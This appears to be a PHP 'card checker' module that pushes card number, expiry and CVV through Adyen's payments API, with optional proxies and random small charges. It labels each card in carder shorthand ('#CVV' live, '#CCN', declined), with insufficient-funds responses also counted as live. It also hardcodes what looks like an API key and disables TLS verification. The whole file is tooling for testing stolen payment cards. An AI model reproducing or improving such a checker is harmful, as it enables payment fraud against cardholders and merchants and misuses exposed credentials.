<?php
/**
 * Adyen Gateway Handler
 * Validates cards against Adyen's payment processing system
 */

// Check a card with Adyen gateway
function checkCardWithAdyen($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig) {
    // Start timing
    $start_time = microtime(true);
    
    // Format month for Adyen (requires 2 digits)
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    
    // Initialize cURL
    $ch = curl_init();
    
    // Set proxy if configured
    if (!empty($proxyConfig)) {
        configureCurlWithProxy($ch, $proxyConfig);
    }
    
    // Common cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    // Set API key and merchant account
    $api_key = !empty($apiKey) ? $apiKey : 'AQEmhmfuXNWTK0Qc+iSXnWgUsk2XoKA+QpHSyRPQWXWa6hvuGxVlESXJfNbVrJRLwD3kbq8MrsQwQwE=-69Jz2A/uVdmJleQ24LBOPcIwOwrQHUQ/CZQXCSk+75U=-SzpMwR*z5$CsY$w3';
    $merchant_account = !empty($secretKey) ? $secretKey : 'AdyenRecruitmentCOM';
    
    // Generate random order reference
    $order_ref = 'ORD_' . rand(10000000, 99999999);
    
    // Get shopper IP
    $shopper_ip = $_SERVER['REMOTE_ADDR'] ?? '8.8.8.8';
    
    // Generate payment data
    $payment_data = [
        'amount' => [
            'currency' => 'USD',
            'value' => rand(100, 999) // Random amount between $1-$9.99
        ],
        'reference' => $order_ref,
        'paymentMethod' => [
            'type' => 'scheme',
            'number' => $cc,
            'expiryMonth' => $mes,
            'expiryYear' => $ano,
            'cvc' => $cvv,
            'holderName' => $user_data['name']
        ],
        'merchantAccount' => $merchant_account,
        'shopperIP' => $shopper_ip,
        'browserInfo' => [
            'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'acceptHeader' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'language' => 'en-US',
            'colorDepth' => 24,
            'screenHeight' => 1080,
            'screenWidth' => 1920,
            'timeZoneOffset' => 240,
            'javaEnabled' => false
        ],
        'shopperEmail' => $user_data['email'],
        'shopperName' => [
            'firstName' => $user_data['first_name'],
            'lastName' => $user_data['last_name']
        ],
        'billingAddress' => [
            'city' => $user_data['city'],
            'country' => 'US',
            'houseNumberOrName' => '',
            'postalCode' => $user_data['postcode'],
            'stateOrProvince' => $user_data['state'],
            'street' => $user_data['street']
        ],
        'deliveryAddress' => [
            'city' => $user_data['city'],
            'country' => 'US',
            'houseNumberOrName' => '',
            'postalCode' => $user_data['postcode'],
            'stateOrProvince' => $user_data['state'],
            'street' => $user_data['street']
        ]
    ];
    
    // Set request options
    curl_setopt($ch, CURLOPT_URL, "https://checkout-test.adyen.com/v68/payments");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "X-API-Key: " . $api_key
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payment_data));
    
    $result = curl_exec($ch);
    
    // Get error if request failed
    $error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    curl_close($ch);
    
    // Calculate time taken
    $time_taken = number_format(microtime(true) - $start_time, 2);
    
    // Format bin info for display
    $bin_info_formatted = formatBinInfo($bin_data);
    
    // Check for connection issues
    if (!$result || $error) {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Adyen Connection Error: $error | Time: " . $time_taken . "s ]";
    }
    
    // Process response
    $response = json_decode($result, true);
    
    if (isset($response['resultCode'])) {
        $result_code = $response['resultCode'];
        
        if ($result_code === 'Authorised') {
            return "✅ #CVV - $cc|$mes|$ano|$cvv - [ Adyen: Authorised | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } elseif ($result_code === 'RedirectShopper' || $result_code === 'IdentifyShopper' || $result_code === 'ChallengeShopper') {
            // 3D Secure flow needed
            return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Adyen: 3D Secure Required | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } else {
            // Declined
            $refusal_reason = $response['refusalReason'] ?? 'Unknown Reason';
            
            if (strpos(strtolower($refusal_reason), 'cvc') !== false) {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Adyen: $refusal_reason | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } elseif (strpos(strtolower($refusal_reason), 'avs') !== false) {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Adyen: AVS Check Failed | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } elseif (strpos(strtolower($refusal_reason), 'restricted') !== false) {
                return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Adyen: Card Restricted | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } elseif (strpos(strtolower($refusal_reason), 'not enough balance') !== false) {
                return "✅ #CVV - $cc|$mes|$ano|$cvv - [ Adyen: Insufficient Funds | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } else {
                return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Adyen: $refusal_reason | $bin_info_formatted | Time: " . $time_taken . "s ]";
            }
        }
    } elseif (isset($response['error']) && isset($response['error']['message'])) {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Adyen: " . $response['error']['message'] . " | Time: " . $time_taken . "s ]";
    } else {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Adyen: Unknown Response | Time: " . $time_taken . "s ]";
    }
}
?>